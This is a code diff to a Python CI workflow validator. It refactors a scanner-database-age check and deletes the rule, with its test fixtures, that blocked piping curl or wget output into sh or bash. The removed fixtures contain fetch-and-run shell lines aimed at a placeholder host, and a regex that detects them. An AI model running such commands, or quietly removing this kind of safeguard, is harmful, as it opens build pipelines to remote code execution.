@@ -6147,7 +6147,23 @@ def _workflow_run_scalar(step_block: str) -> bytes:
     return (scalar.rstrip("\n") + "\n").encode() if scalar else b""
 
 
-def _workflow_run_scalars(workflow: str) -> tuple[str, ...]:
+def _workflow_scanner_db_age_invalid(workflow: str) -> bool:
+    global_matches = re.findall(r"^  SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
+    block_matches = re.findall(r"^ *SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
+    if len(global_matches) != 1 or len(block_matches) != 1:
+        return True
+    value = global_matches[0]
+    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
+        value = value[1:-1]
+    if re.fullmatch(r"[0-9]+", value) is None:
+        return True
+    age_days = int(value)
+    if not 0 < age_days <= WORKFLOW_SCANNER_DB_MAX_AGE_DAYS:
+        return True
+    assignment_prefix = re.compile(
+        r"(?<![A-Za-z0-9_])SCANNER_DB_MAX_AGE_DAYS=[^\s;&|]+\s+"
+        r"/?(?:[A-Za-z0-9_.+-]+/)*python3(?:\.\d+)?\s+[^\n;&|]*assert-scanner-db-freshness\.py\b"
+    )
     lines = workflow.splitlines()
     scalars: list[str] = []
     index = 0
@@ -6173,30 +6189,7 @@ def _workflow_run_scalars(workflow: str) -> tuple[str, ...]:
             body.append(line[indent + 2 :] if line else "")
             index += 1
         scalars.append(" ".join(body) if value.startswith(">") else "\n".join(body))
-    return tuple(scalars)
-
-
-def _workflow_scanner_db_age_invalid(workflow: str) -> bool:
-    global_matches = re.findall(r"^  SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
-    block_matches = re.findall(r"^ *SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
-    if len(global_matches) != 1 or len(block_matches) != 1:
-        return True
-    value = global_matches[0]
-    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
-        value = value[1:-1]
-    if re.fullmatch(r"[0-9]+", value) is None:
-        return True
-    age_days = int(value)
-    if not 0 < age_days <= WORKFLOW_SCANNER_DB_MAX_AGE_DAYS:
-        return True
-    assignment_prefix = re.compile(
-        r"(?<![A-Za-z0-9_])SCANNER_DB_MAX_AGE_DAYS=[^\s;&|]+\s+"
-        r"/?(?:[A-Za-z0-9_.+-]+/)*python3(?:\.\d+)?\s+[^\n;&|]*assert-scanner-db-freshness\.py\b"
-    )
-    return any(
-        assignment_prefix.search(re.sub(r"\\\r?\n[ \t]*", " ", scalar)) is not None
-        for scalar in _workflow_run_scalars(workflow)
-    )
+    return any(assignment_prefix.search(re.sub(r"\\\r?\n[ \t]*", " ", scalar)) is not None for scalar in scalars)
 
 
 def _workflow_checkout_sha_consistency_invalid(workflow: str, relative_path: str) -> bool:
@@ -6211,25 +6204,6 @@ def _workflow_checkout_sha_consistency_invalid(workflow: str, relative_path: str
     return (
         not checkout_refs or any(SHA40.fullmatch(ref) is None for ref in checkout_refs) or len(set(checkout_refs)) != 1
     )
-
-
-def _workflow_fetched_output_shell_pipeline_invalid(workflow: str) -> bool:
-    literal_path = r"/?(?:[A-Za-z0-9_.+-]+/)*"
-    source_path = rf"{literal_path}(?:curl|wget)"
-    sink_path = rf"{literal_path}(?:sh|bash)"
-    token_end = r"(?=$|[\s;&|(){}])"
-    source_token = rf"(?:{source_path}|\"{source_path}\"|'{source_path}'){token_end}"
-    sink_token = rf"(?:{sink_path}|\"{sink_path}\"|'{sink_path}'){token_end}"
-    direct_pipeline = re.compile(
-        rf"(?:^|[\s;&|(){{}}])(?:command[ \t]+(?:--[ \t]+)?)?"
-        rf"{source_token}[^\n|;&]*\|[ \t\r\n]*{sink_token}",
-        re.MULTILINE,
-    )
-    for scalar in _workflow_run_scalars(workflow):
-        without_continuations = re.sub(r"\\\r?\n[ \t]*", " ", scalar)
-        if direct_pipeline.search(without_continuations) is not None:
-            return True
-    return False
 
 
 def python_ci_surface_lock_errors(workflow_bytes: bytes) -> list[str]:
@@ -6521,11 +6495,6 @@ def python_ci_preflight_errors(workflow: str) -> list[str]:
     reject(
         _workflow_checkout_sha_consistency_invalid(workflow, ".github/workflows/python-ci.yaml"),
         "python CI actions/checkout SHA must preserve repository-wide checkout SHA consistency",
-    )
-    # CHECK: python-ci-fetched-shell-pipeline
-    reject(
-        _workflow_fetched_output_shell_pipeline_invalid(workflow),
-        "python CI run scalars must not pipe curl or wget output directly to sh or bash",
     )
     # CHECK: python-ci-runner-timeout
     reject(
@@ -6882,48 +6851,6 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
             "checkout SHA consistency changed",
             _workflow_checkout_sha_mutation(workflow),
             "python CI actions/checkout SHA must preserve repository-wide checkout SHA consistency",
-        ),
-        (
-            "network fetch piped to shell",
-            workflow.replace(
-                "      - name: Run python tool self-tests and lock validation\n"
-                "        run: |\n"
-                "          set -euo pipefail\n",
-                "      - name: Run python tool self-tests and lock validation\n"
-                "        run: |\n"
-                "          set -euo pipefail\n"
-                "          /usr/bin/curl --fail https://example.invalid/bootstrap | bash\n",
-                1,
-            ),
-            "python CI run scalars must not pipe curl or wget output directly to sh or bash",
-        ),
-        (
-            "command-prefixed network fetch piped to shell",
-            workflow.replace(
-                "      - name: Run python tool self-tests and lock validation\n"
-                "        run: |\n"
-                "          set -euo pipefail\n",
-                "      - name: Run python tool self-tests and lock validation\n"
-                "        run: |\n"
-                "          set -euo pipefail\n"
-                "          command curl --fail https://example.invalid/bootstrap | /usr/bin/bash\n",
-                1,
-            ),
-            "python CI run scalars must not pipe curl or wget output directly to sh or bash",
-        ),
-        (
-            "quoted command-dash-prefixed network fetch piped to quoted shell",
-            workflow.replace(
-                "      - name: Run python tool self-tests and lock validation\n"
-                "        run: |\n"
-                "          set -euo pipefail\n",
-                "      - name: Run python tool self-tests and lock validation\n"
-                "        run: |\n"
-                "          set -euo pipefail\n"
-                '          command -- "/usr/bin/curl" https://example.invalid/bootstrap | "/bin/sh"\n',
-                1,
-            ),
-            "python CI run scalars must not pipe curl or wget output directly to sh or bash",
         ),
         (
             "declared runner timeout removed",
@@ -7549,11 +7476,6 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
         _workflow_checkout_sha_consistency_invalid(workflow, PUBLISH_PYTHON_WORKFLOW),
         "Python publish actions/checkout SHA must preserve repository-wide checkout SHA consistency",
     )
-    # CHECK: python-publish-fetched-shell-pipeline
-    reject(
-        _workflow_fetched_output_shell_pipeline_invalid(workflow),
-        "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
-    )
     # CHECK: python-publish-buildkit-host-network
     reject(
         buildkit_host_network_invalid,
@@ -7789,64 +7711,6 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
             "checkout-sha-consistency",
             _workflow_checkout_sha_mutation(workflow),
             "Python publish actions/checkout SHA must preserve repository-wide checkout SHA consistency",
-        ),
-        changed(
-            "network-fetch-piped-to-shell",
-            "      - name: Run runtime and evidence gates\n"
-            "        env:\n"
-            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
-            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
-            "          CONTAINER_ENGINE: docker\n"
-            "        run: |\n"
-            "          set -euo pipefail\n",
-            "      - name: Run runtime and evidence gates\n"
-            "        env:\n"
-            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
-            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
-            "          CONTAINER_ENGINE: docker\n"
-            "        run: |\n"
-            "          set -euo pipefail\n"
-            "          /usr/bin/wget -qO- https://example.invalid/bootstrap | /bin/sh\n",
-            "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
-        ),
-        changed(
-            "command-dash-prefixed-network-fetch-piped-to-shell",
-            "      - name: Run runtime and evidence gates\n"
-            "        env:\n"
-            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
-            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
-            "          CONTAINER_ENGINE: docker\n"
-            "        run: |\n"
-            "          set -euo pipefail\n",
-            "      - name: Run runtime and evidence gates\n"
-            "        env:\n"
-            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
-            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
-            "          CONTAINER_ENGINE: docker\n"
-            "        run: |\n"
-            "          set -euo pipefail\n"
-            "          command -- wget -qO- https://example.invalid/bootstrap | /usr/bin/bash\n",
-            "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
-        ),
-        changed(
-            "network-fetch-pipe-newline-to-shell",
-            "      - name: Run runtime and evidence gates\n"
-            "        env:\n"
-            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
-            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
-            "          CONTAINER_ENGINE: docker\n"
-            "        run: |\n"
-            "          set -euo pipefail\n",
-            "      - name: Run runtime and evidence gates\n"
-            "        env:\n"
-            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
-            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
-            "          CONTAINER_ENGINE: docker\n"
-            "        run: |\n"
-            "          set -euo pipefail\n"
-            "          /usr/bin/wget -qO- https://example.invalid/bootstrap |\n"
-            "            /bin/sh\n",
-            "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
         ),
         changed(
             "buildkit-host-network",
